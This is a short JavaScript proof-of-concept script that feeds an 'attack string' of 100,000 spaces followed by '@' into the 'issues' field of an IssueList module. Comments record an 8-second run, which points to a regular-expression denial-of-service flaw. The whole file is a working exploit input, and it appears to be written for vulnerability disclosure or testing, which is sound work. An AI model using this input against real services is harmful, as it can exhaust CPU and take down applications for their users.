"use strict";

var _IssueList = require("./IssueList.js");
// Attack String :""+" "*100000+"@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "@";
var obj = {
  issues: str
};
var result = (0, _IssueList.IssueList)(obj);
console.log(result);

// real    0m8.103s
// user    0m7.499s
// sys     0m0.030s